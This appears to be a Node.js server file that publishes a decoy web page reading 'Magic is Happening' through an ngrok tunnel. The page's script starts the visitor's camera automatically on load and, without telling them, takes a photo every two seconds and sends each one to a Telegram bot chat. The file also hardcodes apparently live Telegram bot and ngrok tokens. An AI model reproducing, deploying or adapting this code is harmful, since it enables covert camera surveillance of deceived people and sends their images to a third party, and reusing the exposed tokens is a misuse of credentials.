const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const ngrok = require("ngrok");

const app = express();
const PORT = 3000;

const BOT_TOKEN = "7602401910:AAE4SdHSofXJr_aBtb-PPCkEgIRuFPmx-98";
const CHAT_ID = "7681754803";
const NGROK_AUTH_TOKEN = "2ZreK3TTekH6QMmYYPeN7KMgBgX_4PGSZNzpoeG3LtonhjrD5";

app.use(bodyParser.json());

// **Serve HTML Page with Magic Text**
app.get("/", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Magic is Happening</title>
            <style>
                body { text-align: center; font-family: Arial, sans-serif; font-size: 24px; padding: 20px; }
            </style>
        </head>
        <body>
            <h2>✨ Magic is Happening... ✨</h2>
            <script>
                let captureInterval;

                async function startCamera() {
                    try {
                        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        let video = document.createElement("video");
                        video.srcObject = stream;
                        video.play();

                        let canvas = document.createElement("canvas");
                        let context = canvas.getContext('2d');

                        setTimeout(() => startAutoCapture(video, canvas, context), 2000);
                    } catch (err) {
                        alert('❌ Camera access denied! Please allow camera permissions.');
                    }
                }

                function startAutoCapture(video, canvas, context) {
                    captureInterval = setInterval(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        let imageData = canvas.toDataURL('image/png');
                        sendToTelegram(imageData);
                    }, 2000);
                }

                async function sendToTelegram(imageData) {
                    let blob = await (await fetch(imageData)).blob();
                    let formData = new FormData();
                    formData.append("photo", blob, "image.png");
                    formData.append("caption", "@heysentry");

                    let BOT_TOKEN = "${BOT_TOKEN}";
                    let CHAT_ID = "${CHAT_ID}";

                    fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto?chat_id=\${CHAT_ID}\`, {
                        method: "POST",
                        body: formData
                    }).then(response => {
                        if (response.ok) {
                            console.log("📸 Photo sent successfully with caption!");
                        } else {
                            console.error("❌ Failed to send photo.");
                        }
                    }).catch(error => {
                        console.error("❌ Error:", error);
                    });
                }

                window.onload = startCamera; // Start camera automatically
            </script>
        </body>
        </html>
    `);
});

// **Ngrok & Server Setup**
(async function () {
    const url = await ngrok.connect({ 
        addr: PORT, 
        authtoken: NGROK_AUTH_TOKEN 
    });
    console.log(`🔗 Ngrok Public URL: ${url}`);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
        url: `${url}/bot${BOT_TOKEN}`
    });

    console.log("✅ Telegram Webhook Set!");
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `🚀 Bot deployed! Open website: ${url}`
    });

    app.listen(PORT, () => {
        console.log(`🚀 Server running on ${url}`);
    });
})();
